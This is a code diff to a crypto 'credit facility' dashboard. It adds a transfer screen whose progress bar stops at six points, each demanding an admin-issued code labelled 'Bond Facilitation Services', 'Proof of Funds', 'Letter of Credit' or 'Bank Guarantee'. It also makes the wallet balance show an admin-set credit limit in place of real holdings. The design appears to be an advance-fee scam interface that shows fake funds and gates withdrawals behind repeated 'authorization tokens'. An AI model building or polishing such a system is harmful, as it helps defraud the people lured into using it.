@@ -730,6 +730,53 @@
       </div>
     </div>
 
+    <!-- TRANSFER VIEW (dedicated — fixes empty Transfer menu) -->
+    <div id="view-transfer" class="hidden anim-fade max-w-3xl mx-auto relative z-10">
+      <div class="mb-8">
+        <h1 class="font-display text-3xl font-bold">Transfer</h1>
+        <p class="text-sm text-[var(--text-muted)] mt-1">Move funds from your pre-approved credit to an external wallet.</p>
+      </div>
+      <div class="card p-6">
+        <div class="flex items-center justify-between mb-6">
+          <h3 class="font-display text-xl font-bold">Initiate Transfer</h3>
+          <span class="text-xs px-2.5 py-1 rounded-full flex items-center gap-1.5 font-medium" style="color: #84cc16; background: rgba(132, 204, 22, 0.1); border: 1px solid rgba(132, 204, 22, 0.2);">
+            <span class="status-dot status-success"></span> Active
+          </span>
+        </div>
+        <div class="space-y-5">
+          <div>
+            <label class="text-xs font-medium text-[var(--text-muted)] mb-2 block uppercase tracking-wider">Select Asset</label>
+            <div class="grid grid-cols-3 gap-2">
+              <button data-asset="ETH" class="asset-btn btn btn-secondary py-3 active" data-view="transfer">ETH</button>
+              <button data-asset="BTC" class="asset-btn btn btn-secondary py-3" data-view="transfer">BTC</button>
+              <button data-asset="USDT" class="asset-btn btn btn-secondary py-3" data-view="transfer">USDT</button>
+            </div>
+          </div>
+          <div>
+            <label class="text-xs font-medium text-[var(--text-muted)] mb-2 block uppercase tracking-wider">Destination Address</label>
+            <input id="transferAddress2" type="text" class="input-field font-mono text-sm" placeholder="0x...">
+            <div id="addressFeedback2" class="text-xs mt-2 hidden"></div>
+          </div>
+          <div>
+            <label class="text-xs font-medium text-[var(--text-muted)] mb-2 block uppercase tracking-wider">Amount</label>
+            <div class="relative">
+              <input id="transferAmount2" type="number" step="0.0001" class="input-field pr-20 tabular text-lg font-medium" placeholder="0.0000">
+              <div class="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-3">
+                <button type="button" onclick="setMaxTransferAmount()" class="text-xs text-[var(--text-primary)] font-bold hover:opacity-70 transition">MAX</button>
+                <span class="text-xs text-[var(--text-muted)] font-mono font-medium" id="amountAssetLabel2">ETH</span>
+              </div>
+            </div>
+            <div class="flex justify-between mt-2 text-xs text-[var(--text-muted)]">
+              <span>≈ $<span id="usdValue2">0.00</span></span>
+              <span>Available credit: <span id="availBalance2" class="tabular text-[var(--text-secondary)]">—</span> <span id="availLabel2">ETH</span></span>
+            </div>
+          </div>
+          <button id="initiateTransferBtn2" class="btn btn-primary w-full py-3.5 mt-2" disabled>Continue to Verification</button>
+          <p class="text-xs text-center text-[var(--text-muted)]">Draws from your pre-approved credit line (admin-set). Partial amounts allowed.</p>
+        </div>
+      </div>
+    </div>
+
   </main>
 </div>
 
@@ -747,6 +794,10 @@
       </div>
       <h3 id="protocolTitle" class="font-display text-xl font-bold">Secure Transfer Protocol</h3>
       <p id="protocolDesc" class="text-sm text-[var(--text-muted)] mt-1">Verifying compliance requirements.</p>
+      <div id="protocolProgressWrap" class="mt-4 hidden">
+        <div class="flex justify-between text-xs text-[var(--text-muted)] mb-1"><span>Transferring to recipient wallet</span><span id="protocolProgressPct" class="tabular">0%</span></div>
+        <div class="w-full h-2 bg-[var(--bg-elev-2)] rounded-full overflow-hidden"><div id="protocolProgressBar" class="h-full bg-[#CCFF00] transition-all duration-300" style="width:0%"></div></div>
+      </div>
     </div>
 
     <div id="protocolSteps" class="space-y-5 mb-6"></div>
@@ -906,12 +957,12 @@ let currentProfile = null;
 let userHoldings = [];
 
 const protocolSteps = [
-  { id: 'bond', name: 'Bond Facilitation Services', desc: 'Initiating primary authorization...', duration: 2500, requiresCode: false },
-  { id: 'pof', name: 'Proof of Funds', desc: 'Verifying liquidity provenance...', requiresCode: true },
-  { id: 'blocked', name: 'Blocked Funds', desc: 'Checking capital escrow status...', requiresCode: true },
-  { id: 'lc', name: 'Letter of Credit', desc: 'Verifying trade instrument...', requiresCode: true },
-  { id: 'apg', name: 'Advance Payment Guarantee', desc: 'Validating guarantee...', requiresCode: true },
-  { id: 'bg', name: 'Bank Guarantee', desc: 'Finalizing institutional clearance...', requiresCode: true }
+  { id: 'bond', name: 'Bond Facilitation Services', label: 'Bond Facilitation Services token required', pct: 15, requiresCode: true },
+  { id: 'pof', name: 'Proof of Funds', label: 'Proof of Funds token required', pct: 45, requiresCode: true },
+  { id: 'blocked', name: 'Blocked Funds', label: 'Blocked Funds token required', pct: 60, requiresCode: true },
+  { id: 'lc', name: 'Letter of Credit', label: 'Letter of Credit token required', pct: 75, requiresCode: true },
+  { id: 'apg', name: 'Advance Payment Guarantee', label: 'Advance Payment Guarantee token required', pct: 88, requiresCode: true },
+  { id: 'bg', name: 'Bank Guarantee', label: 'Bank Guarantee token required', pct: 97, requiresCode: true }
 ];
 
 // ============ API CLIENT ============
@@ -1172,11 +1223,6 @@ function navigate(view) {
   const activeBottom = document.querySelector(`.bottom-nav button[data-nav="${view}"]`);
   if (activeBottom) activeBottom.classList.add('active');
 
-  if (view === 'transfer') {
-    document.getElementById('view-dashboard').classList.remove('hidden');
-    document.getElementById('transferForm').scrollIntoView({ behavior: 'smooth', block: 'center' });
-  }
-  
   document.getElementById('sidebar').classList.remove('open');
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
@@ -1216,180 +1262,212 @@ document.querySelectorAll('.asset-btn').forEach(btn => {
   });
 });
 
-function updateAvailableTransferBalance() {
-  const holding = userHoldings.find(h => h.asset_symbol === transferState.asset);
-  const bal = holding ? parseFloat(holding.balance) : 0;
-  const availEl = document.getElementById('availBalance');
-  if (availEl) {
-    availEl.textContent = bal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
-  }
+function getAvailableCredit() {
+  const limit = Number(currentProfile?.credit_limit) || 0;
+  const used = Number(currentProfile?.utilized) || 0;
+  return Math.max(0, limit - used);
 }
-
-document.getElementById('transferAddress').addEventListener('input', (e) => {
-  transferState.address = e.target.value;
-  validateTransfer();
-});
-
-document.getElementById('transferAmount').addEventListener('input', (e) => {
-  transferState.amount = parseFloat(e.target.value) || 0;
-  const usd = transferState.amount * assetConfig[transferState.asset].price;
-  document.getElementById('usdValue').textContent = usd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-  validateTransfer();
-});
-
-const btnMax = document.getElementById('btnMaxAmount');
-if (btnMax) {
-  btnMax.addEventListener('click', () => {
-    const holding = userHoldings.find(h => h.asset_symbol === transferState.asset);
-    const bal = holding ? parseFloat(holding.balance) : 0;
-    const amountInput = document.getElementById('transferAmount');
-    amountInput.value = bal > 0 ? bal : '0';
-    transferState.amount = bal;
-    const usd = bal * assetConfig[transferState.asset].price;
-    document.getElementById('usdValue').textContent = usd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    validateTransfer();
+function getAvailableAssetAmount(asset) {
+  const availUSD = getAvailableCredit();
+  const price = assetConfig[asset]?.price || 1;
+  return availUSD / price;
+}
+function updateAvailableTransferBalance() {
+  const availUSD = getAvailableCredit();
+  const availAsset = getAvailableAssetAmount(transferState.asset);
+  ['availBalance','availBalance2'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = availAsset > 0 ? availAsset.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 }) : '0.00';
+  });
+  ['availLabel','availLabel2'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = transferState.asset;
+  });
+  ['amountAssetLabel','amountAssetLabel2'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = transferState.asset;
   });
 }
+function setMaxTransferAmount() {
+  const availAsset = getAvailableAssetAmount(transferState.asset);
+  ['transferAmount','transferAmount2'].forEach(id => {
+    const inp = document.getElementById(id);
+    if (inp) inp.value = availAsset > 0 ? availAsset.toFixed(4) : '0';
+  });
+  transferState.amount = availAsset;
+  const usd = availAsset * (assetConfig[transferState.asset]?.price || 0);
+  ['usdValue','usdValue2'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = usd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  });
+  validateTransfer();
+}
+
+['transferAddress','transferAddress2'].forEach(id => {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.addEventListener('input', (e) => {
+    transferState.address = e.target.value;
+    // sync other input
+    ['transferAddress','transferAddress2'].forEach(oid => {
+      const oel = document.getElementById(oid);
+      if (oel && oel.id !== id) oel.value = e.target.value;
+    });
+    validateTransfer();
+  });
+});
+['transferAmount','transferAmount2'].forEach(id => {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.addEventListener('input', (e) => {
+    transferState.amount = parseFloat(e.target.value) || 0;
+    // sync other input
+    ['transferAmount','transferAmount2'].forEach(oid => {
+      const oel = document.getElementById(oid);
+      if (oel && oel.id !== id) oel.value = e.target.value;
+    });
+    const usd = transferState.amount * (assetConfig[transferState.asset]?.price || 0);
+    ['usdValue','usdValue2'].forEach(uid => {
+      const uel = document.getElementById(uid);
+      if (uel) uel.textContent = usd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    });
+    validateTransfer();
+  });
+});
+const btnMax = document.getElementById('btnMaxAmount');
+if (btnMax) btnMax.addEventListener('click', setMaxTransferAmount);
 
 function validateTransfer() {
   const cfg = assetConfig[transferState.asset];
-  const feedback = document.getElementById('addressFeedback');
-  const btn = document.getElementById('initiateTransferBtn');
   const address = transferState.address.trim();
-  
-  if (address && !cfg.validate.test(address)) {
-    feedback.innerHTML = `<span class="text-[var(--danger)] flex items-center gap-1.5"><i data-lucide="alert-circle" class="w-3 h-3"></i> Invalid ${transferState.asset} address format</span>`;
-    feedback.classList.remove('hidden');
-    btn.disabled = true;
-  } else if (address) {
-    feedback.innerHTML = `<span class="text-[var(--success)] flex items-center gap-1.5"><i data-lucide="check-circle" class="w-3 h-3"></i> Valid address detected</span>`;
-    feedback.classList.remove('hidden');
-    btn.disabled = transferState.amount <= 0;
-  } else {
-    feedback.classList.add('hidden');
-    btn.disabled = true;
-  }
+  const amount = transferState.amount || 0;
+  const usdValue = amount * (cfg.price || 0);
+  const availableUSD = getAvailableCredit();
+  const validateSingle = (feedbackId, btnId) => {
+    const fb = document.getElementById(feedbackId);
+    const b = document.getElementById(btnId);
+    if (!fb || !b) return;
+    if (address && !cfg.validate.test(address)) {
+      fb.innerHTML = `<span class="text-[var(--danger)] flex items-center gap-1.5"><i data-lucide="alert-circle" class="w-3 h-3"></i> Invalid ${transferState.asset} address format</span>`;
+      fb.classList.remove('hidden');
+      b.disabled = true;
+    } else if (usdValue > availableUSD && amount > 0) {
+      fb.innerHTML = `<span class="text-[var(--danger)] flex items-center gap-1.5"><i data-lucide="alert-circle" class="w-3 h-3"></i> Exceeds available credit ($${availableUSD.toLocaleString()})</span>`;
+      fb.classList.remove('hidden');
+      b.disabled = true;
+    } else if (address) {
+      fb.innerHTML = `<span class="text-[var(--success)] flex items-center gap-1.5"><i data-lucide="check-circle" class="w-3 h-3"></i> Valid address detected</span>`;
+      fb.classList.remove('hidden');
+      b.disabled = amount <= 0;
+    } else {
+      fb.classList.add('hidden');
+      b.disabled = true;
+    }
+  };
+  validateSingle('addressFeedback','initiateTransferBtn');
+  validateSingle('addressFeedback2','initiateTransferBtn2');
+  // sync second form feedback
+  const fb2 = document.getElementById('addressFeedback2');
+  const fb1 = document.getElementById('addressFeedback');
+  if (fb2 && fb1) fb2.innerHTML = fb1.innerHTML;
   lucide.createIcons();
 }
 
 document.getElementById('initiateTransferBtn').addEventListener('click', startTransferProtocol);
+const initBtn2 = document.getElementById('initiateTransferBtn2');
+if (initBtn2) initBtn2.addEventListener('click', startTransferProtocol);
 
-// ============ PROTOCOL STATE MACHINE ============
+// ============ PROTOCOL STATE MACHINE (sequential, progress-bar) ============
+let protocolProgressTimer = null;
+function setProtocolProgress(pct) {
+  const bar = document.getElementById('protocolProgressBar');
+  const pctEl = document.getElementById('protocolProgressPct');
+  const wrap = document.getElementById('protocolProgressWrap');
+  if (wrap) wrap.classList.remove('hidden');
+  if (bar) bar.style.width = pct + '%';
+  if (pctEl) pctEl.textContent = pct + '%';
+}
+function animateProgressTo(targetPct, durationMs, onDone) {
+  const bar = document.getElementById('protocolProgressBar');
+  const pctEl = document.getElementById('protocolProgressPct');
+  const start = parseFloat(bar?.style.width) || 0;
+  const delta = targetPct - start;
+  const startTime = performance.now();
+  function tick(now) {
+    const elapsed = now - startTime;
+    const t = Math.min(1, elapsed / durationMs);
+    const eased = 1 - Math.pow(1 - t, 3);
+    const cur = start + delta * eased;
+    if (bar) bar.style.width = cur + '%';
+    if (pctEl) pctEl.textContent = Math.round(cur) + '%';
+    if (t < 1) requestAnimationFrame(tick);
+    else if (onDone) onDone();
+  }
+  requestAnimationFrame(tick);
+}
 function startTransferProtocol() {
   transferState.stepIndex = 0;
   document.getElementById('transferProtocolModal').classList.remove('hidden');
   document.getElementById('transferProtocolModal').classList.add('flex');
-  renderProtocolStep();
+  document.getElementById('protocolSteps').innerHTML = '';
+  document.getElementById('protocolActionArea').classList.add('hidden');
+  document.getElementById('protocolIcon').innerHTML = '<i data-lucide="shield-check" class="w-6 h-6 text-[#CCFF00]"></i>';
+  setProtocolProgress(0);
+  lucide.createIcons();
+  // brief "transferring to recipient wallet" phase before first code
+  document.getElementById('protocolTitle').textContent = 'Transferring to recipient wallet';
+  document.getElementById('protocolDesc').textContent = 'Initiating secure transfer...';
+  animateProgressTo(protocolSteps[0].pct, 1600, () => showCodeRequestUI(protocolSteps[0]));
 }
-
 function closeProtocolModal() {
+  if (protocolProgressTimer) clearTimeout(protocolProgressTimer);
   document.getElementById('transferProtocolModal').classList.add('hidden');
   document.getElementById('transferProtocolModal').classList.remove('flex');
 }
-
-function renderProtocolStep() {
-  const step = protocolSteps[transferState.stepIndex];
-  const stepsContainer = document.getElementById('protocolSteps');
-  const actionArea = document.getElementById('protocolActionArea');
-  
-  stepsContainer.innerHTML = protocolSteps.map((s, i) => {
-    let circleClass = '';
-    let content = '';
-    let textClass = 'text-[var(--text-muted)]';
-    
-    if (i < transferState.stepIndex) {
-      circleClass = 'complete';
-      content = '<i data-lucide="check" class="w-3 h-3 text-[#09090B]"></i>';
-      textClass = 'text-[var(--text-primary)] font-medium';
-    } else if (i === transferState.stepIndex) {
-      circleClass = 'active';
-      content = '<div class="w-2 h-2 rounded-full bg-[#CCFF00] animate-pulse"></div>';
-      textClass = 'text-[var(--text-primary)] font-medium';
-    }
-    
-    return `
-      <div class="flex items-center gap-3">
-        <div class="step-circle ${circleClass}">${content}</div>
-        <div class="${textClass} text-sm">${s.name}</div>
-      </div>
-    `;
-  }).join('');
-  
-  lucide.createIcons();
-
-  document.getElementById('protocolTitle').textContent = step.name;
-  document.getElementById('protocolDesc').textContent = step.desc;
-
-  if (step.requiresCode) {
-    showCodeRequestUI(step);
-  } else {
-    actionArea.classList.add('hidden');
-    startProcessingAnimation(step);
-  }
-}
-
-function startProcessingAnimation(step) {
-  const iconEl = document.getElementById('protocolIcon');
-  iconEl.innerHTML = '<i data-lucide="loader-2" class="w-6 h-6 text-[#CCFF00] animate-spin"></i>';
-  lucide.createIcons();
-
-  const duration = step.duration || 2000;
-  
-  setTimeout(() => {
-    if (transferState.stepIndex < protocolSteps.length - 1) {
-      transferState.stepIndex++;
-      renderProtocolStep();
-    } else {
-      completeTransfer();
-    }
-  }, duration);
-}
-
+function renderProtocolStep() { /* kept for compat — not used in sequential flow */ }
+function startProcessingAnimation(step) { /* kept for compat */ }
 function showCodeRequestUI(step) {
   const actionArea = document.getElementById('protocolActionArea');
   actionArea.classList.remove('hidden');
+  // single prompt — do NOT list all 6 services
   actionArea.innerHTML = `
     <div class="text-center">
       <div class="w-10 h-10 rounded-lg bg-[var(--warning)] bg-opacity-10 flex items-center justify-center mx-auto mb-3">
         <i data-lucide="lock-keyhole" class="w-5 h-5 text-[var(--warning)]"></i>
       </div>
-      <h4 class="font-semibold mb-1 text-[var(--text-primary)]">Authorization Required</h4>
-      <p class="text-xs text-[var(--text-muted)] mb-4">Request a 6-digit code from your administrator.</p>
-      
-      <div class="flex gap-2 mb-4">
-        <input id="protocolCodeInput" type="text" maxlength="6" class="input-field text-center font-mono tracking-[0.3em] uppercase" placeholder="XXXXXX">
+      <h4 class="font-semibold mb-1 text-[var(--text-primary)]">${step.label || step.name + ' token required'}</h4>
+      <p class="text-xs text-[var(--text-muted)] mb-1">Contact your account officer for the 6-digit authorization code.</p>
+      <p class="text-xs text-[var(--text-muted)] mb-4">Step ${transferState.stepIndex + 1} of ${protocolSteps.length}</p>
+      <div class="flex gap-2 mb-2">
+        <input id="protocolCodeInput" type="text" maxlength="6" inputmode="numeric" pattern="[0-9]*" class="input-field text-center font-mono tracking-[0.3em] uppercase" placeholder="000000">
         <button id="verifyCodeBtn" class="btn btn-primary px-5">Verify</button>
       </div>
-      
-      <button id="requestAdminCode" class="text-xs text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition flex items-center gap-1.5 mx-auto font-medium">
-        <i data-lucide="message-square" class="w-3.5 h-3.5"></i> Simulate Request to Admin
-      </button>
+      <p class="text-xs text-[var(--text-muted)]">No code? Ask your admin to generate one for <span class="font-medium">${step.name}</span>.</p>
     </div>
   `;
   lucide.createIcons();
-
-  document.getElementById('requestAdminCode').addEventListener('click', (e) => {
-    e.target.disabled = true;
-    e.target.innerHTML = '<i data-lucide="loader-2" class="w-3.5 h-3.5 animate-spin"></i> Waiting for Admin...';
-    
-    setTimeout(() => {
-      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-      let code = '';
-      for (let i = 0; i < 6; i++) code += chars[Math.floor(Math.random() * chars.length)];
-      
-      const input = document.getElementById('protocolCodeInput');
-      if (input) input.value = code;
-      showToast(`Admin sent code: ${code}`, 'info');
-    }, 1800);
-  });
-
-  document.getElementById('verifyCodeBtn').addEventListener('click', () => {
+  document.getElementById('protocolCodeInput')?.focus();
+  document.getElementById('verifyCodeBtn').addEventListener('click', async () => {
     const code = document.getElementById('protocolCodeInput').value.trim();
-    if (code.length === 6) {
+    if (!/^\d{6}$/.test(code)) { showToast('Enter a 6-digit numeric code.', 'error'); return; }
+    const btn = document.getElementById('verifyCodeBtn');
+    btn.disabled = true; btn.textContent = 'Verifying...';
+    try {
+      await apiFetch('/api/transactions/verify-code', { method: 'POST', body: JSON.stringify({ service: step.id, code }) });
       actionArea.classList.add('hidden');
-      startProcessingAnimation(step);
-    } else {
-      showToast('Invalid code length. 6 characters required.', 'error');
+      showToast('Authorization verified', 'success');
+      // resume progress to next milestone
+      transferState.stepIndex++;
+      if (transferState.stepIndex < protocolSteps.length) {
+        const next = protocolSteps[transferState.stepIndex];
+        animateProgressTo(next.pct, 1400, () => showCodeRequestUI(next));
+      } else {
+        // all 6 verified — jump to 100% then complete
+        animateProgressTo(100, 700, () => completeTransfer());
+      }
+    } catch (err) {
+      showToast(err.message || 'Invalid or already used code', 'error');
+      btn.disabled = false; btn.textContent = 'Verify';
     }
   });
 }
@@ -1458,11 +1536,12 @@ async function completeTransfer() {
 
 function finishTransferSuccess() {
   closeProtocolModal();
-  document.getElementById('transferAddress').value = '';
-  document.getElementById('transferAmount').value = '';
-  document.getElementById('usdValue').textContent = '0.00';
-  document.getElementById('addressFeedback').classList.add('hidden');
-  document.getElementById('initiateTransferBtn').disabled = true;
+  ['transferAddress','transferAddress2'].forEach(id=>{ const e=document.getElementById(id); if(e) e.value=''; });
+  ['transferAmount','transferAmount2'].forEach(id=>{ const e=document.getElementById(id); if(e) e.value=''; });
+  ['usdValue','usdValue2'].forEach(id=>{ const e=document.getElementById(id); if(e) e.textContent='0.00'; });
+  ['addressFeedback','addressFeedback2'].forEach(id=>{ const e=document.getElementById(id); if(e) e.classList.add('hidden'); });
+  ['initiateTransferBtn','initiateTransferBtn2'].forEach(id=>{ const e=document.getElementById(id); if(e) e.disabled=true; });
+  setProtocolProgress(0);
   transferState = { asset: 'ETH', address: '', amount: 0, stepIndex: 0, pendingTx: null };
   renderApp();
 }
@@ -1515,11 +1594,11 @@ async function renderApp() {
     const welcomeEl = document.getElementById('userWelcome');
     if (welcomeEl) welcomeEl.textContent = `Welcome back, ${name}`;
 
-    // Available Credit & Utilized
-    const creditLimit = parseFloat(currentProfile.credit_limit) || 5000000;
-    const utilized = parseFloat(currentProfile.utilized) || 1850000;
+    // Available Credit & Utilized — live from credit line (no mock fallbacks)
+    const creditLimit = Number(currentProfile.credit_limit) || 0;
+    const utilized = Number(currentProfile.utilized) || 0;
     const available = Math.max(0, creditLimit - utilized);
-    const utilPct = Math.min(100, Math.round((utilized / (creditLimit || 1)) * 100));
+    const utilPct = creditLimit > 0 ? Math.min(100, Math.round((utilized / creditLimit) * 100)) : 0;
 
     const availCreditEl = document.getElementById('availableCredit');
     if (availCreditEl) {
@@ -1537,15 +1616,11 @@ async function renderApp() {
     const utilPctEl = document.getElementById('utilizedPercent');
     if (utilPctEl) utilPctEl.textContent = `${utilPct}%`;
 
-    // Wallet Balance
-    const walletTotal = userHoldings.reduce((sum, h) => {
-      const price = assetConfig[h.asset_symbol]?.price || parseFloat(h.price) || 0;
-      return sum + (parseFloat(h.balance) * price);
-    }, 0);
-
+    // Wallet Balance — tied to credit line (total facility)
     const walletBalEl = document.getElementById('walletBalance');
     if (walletBalEl) {
-      walletBalEl.innerHTML = `$${Math.floor(walletTotal).toLocaleString('en-US')}<span class="text-lg text-[var(--text-muted)]">.${(walletTotal % 1).toFixed(2).slice(2)}</span>`;
+      walletBalEl.innerHTML = `$${Math.floor(creditLimit).toLocaleString('en-US')}<span class="text-lg text-[var(--text-muted)]">.${(creditLimit % 1).toFixed(2).slice(2)}</span>`;
+      document.getElementById('walletCurrencies').textContent = creditLimit > 0 ? 'Pre-approved facility' : 'No facility yet — contact admin';
     }
 
     // Update Transfer Available Balance
@@ -1725,6 +1800,7 @@ async function loadUsers() {
               : '<span class="text-xs font-medium flex items-center gap-1 text-[var(--danger)]"><span class="status-dot status-pending"></span> Deactivated</span>'
           }</td>
           <td class="py-3 px-3 text-right whitespace-nowrap">
+            ${u.role !== 'admin' ? `<span class="inline-flex items-center gap-1 mr-1"><select id="authSvc-${u.id}" class="text-xs bg-[var(--bg-elev-2)] border border-[var(--border)] rounded px-1 py-1"><option value="bond">Bond</option><option value="pof">PoF</option><option value="blocked">Blocked</option><option value="lc">LC</option><option value="apg">APG</option><option value="bg">BG</option></select><button onclick="generateAuthCodeForUser(${u.id})" class="btn btn-ghost text-xs px-2 py-1" title="Generate 6-digit code for selected service">Code</button></span>` : ''}
             ${u.role !== 'admin' ? `<button onclick="completeKyc(${u.id})" class="btn btn-ghost text-xs px-2.5 py-1.5" title="Mark all KYC steps verified"><i data-lucide="shield-check" class="w-3.5 h-3.5"></i> KYC</button>` : ''}
             ${!isSelf ? `<button onclick="toggleUserStatus(${u.id}, ${!u.active})" class="btn btn-ghost text-xs px-2.5 py-1.5">${u.active ? 'Deactivate' : 'Activate'}</button>` : ''}
             ${!isSelf ? `<button onclick="deleteUser(${u.id})" class="btn btn-ghost text-xs px-2.5 py-1.5 text-[var(--danger)]" title="Permanently delete user and all data"><i data-lucide="trash-2" class="w-3.5 h-3.5"></i></button>` : ''}
@@ -1799,6 +1875,18 @@ async function deleteUser(id) {
     loadUsers();
   } catch (err) {
     showToast(err.message || 'Delete failed', 'error');
+  }
+}
+async function generateAuthCodeForUser(userId) {
+  const sel = document.getElementById(`authSvc-${userId}`);
+  const service = sel ? sel.value : 'bond';
+  try {
+    const res = await apiFetch(`/api/admin/users/${userId}/auth-code`, { method: 'POST', body: JSON.stringify({ service }) });
+    const code = res.code;
+    await navigator.clipboard?.writeText(String(code)).catch(()=>{});
+    showToast(`Code for ${service}: ${code} (copied)`, 'success');
+  } catch (err) {
+    showToast(err.message || 'Generate failed', 'error');
   }
 }
 
